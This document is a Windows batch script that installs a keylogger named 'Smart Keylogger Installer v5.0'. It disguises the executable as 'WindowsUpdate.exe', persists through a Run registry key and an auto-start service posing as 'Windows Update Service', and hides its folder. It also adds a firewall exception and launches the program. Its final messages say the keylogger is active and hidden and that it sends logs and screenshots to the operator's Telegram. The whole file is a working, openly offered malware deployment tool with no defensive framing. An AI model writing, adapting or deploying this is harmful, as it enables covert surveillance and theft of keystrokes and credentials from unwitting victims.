@echo off
echo ========================================
echo    Smart Keylogger Installer v5.0
echo ========================================
echo.

:: Check for administrator rights
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo [!] Please run as Administrator!
    echo Right-click and select "Run as administrator"
    pause
    exit /b 1
)

:: Set paths
set "INSTALL_DIR=%ProgramData%\WindowsUpdate"
set "SERVICE_NAME=WindowsUpdate"
set "EXE_NAME=WindowsUpdate.exe"

echo [+] Creating installation directory...
if not exist "%INSTALL_DIR%" mkdir "%INSTALL_DIR%"

echo [+] Copying files...
:: Copy the main executable
copy "%~dp0smartkeylogger.exe" "%INSTALL_DIR%\%EXE_NAME%" >nul

:: Copy OpenSSL DLLs
if exist "%~dp0libssl-3-x64.dll" (
    copy "%~dp0libssl-3-x64.dll" "%INSTALL_DIR%\" >nul
    echo [✓] libssl-3-x64.dll copied
)

if exist "%~dp0libcrypto-3-x64.dll" (
    copy "%~dp0libcrypto-3-x64.dll" "%INSTALL_DIR%\" >nul
    echo [✓] libcrypto-3-x64.dll copied
)

:: Copy configuration file if exists
if exist "%~dp0config.ini" (
    copy "%~dp0config.ini" "%INSTALL_DIR%\" >nul
)

echo [+] Setting up persistence...
:: Add to registry for startup
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdate" /t REG_SZ /d "%INSTALL_DIR%\%EXE_NAME%" /f >nul

:: Also add to services for more stealth
sc create "%SERVICE_NAME%" binPath= "%INSTALL_DIR%\%EXE_NAME%" start= auto DisplayName= "Windows Update Service" >nul 2>&1

:: Hide the installation directory
attrib +s +h "%INSTALL_DIR%" >nul

echo [+] Creating firewall exception...
:: Allow through Windows Firewall
netsh advfirewall firewall add rule name="Windows Update" dir=in action=allow program="%INSTALL_DIR%\%EXE_NAME%" enable=yes >nul 2>&1

echo [+] Starting the service...
:: Start the application
start "" "%INSTALL_DIR%\%EXE_NAME%"

echo.
echo [✓] Installation completed successfully!
echo [✓] Keylogger is now active and hidden
echo [✓] Logs will be sent to your Telegram
echo [✓] Screenshots on important activity
echo.
echo Location: %INSTALL_DIR%
echo Service: %SERVICE_NAME%
echo.
echo Press any key to exit...
pause >nul
exit
